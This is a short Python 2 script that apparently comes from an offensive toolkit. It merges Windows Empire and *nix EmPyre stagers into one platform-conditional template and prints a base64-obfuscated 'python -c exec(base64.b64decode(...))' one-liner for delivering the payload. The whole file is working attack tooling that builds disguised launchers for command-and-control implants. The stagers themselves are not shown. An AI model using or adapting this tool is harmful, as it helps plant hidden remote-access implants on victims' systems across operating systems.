#!/usr/bin/python
import os, sys, argparse, base64

parser = argparse.ArgumentParser(description='Stitch together Emp*re stagers (python) to conditionally execute based on platform')
parser.add_argument('-w', '--windows', help='Path to Windows (Empire) stager')
parser.add_argument('-n', '--nix', help='Path to *nix (EmPyre) stager')
args = parser.parse_args()

if not args.windows or not args.nix:
    parser.print_help()
    print '[-] You must specify both a Windows stager and a *nix stager to continue'
    sys.exit()

# Gotta catch 'em all
try:
    with open(args.windows, 'r') as f:
        windows_stager = f.read().strip()

    with open(args.nix, 'r') as f:
        nix_stager = f.read().strip()

    with open('stager_template.py', 'r') as f:
        stager_template = f.read()

    stager_template = stager_template.replace('##EMPIREWINDOWS##', windows_stager)
    stager_template = stager_template.replace('##EMPIRENIX##', nix_stager)
    print '''python -c "import sys,base64;exec(base64.b64decode('%s'));"''' % (base64.b64encode(stager_template))

except Exception, e:
    print '[-] Error: %s' % (str(e))
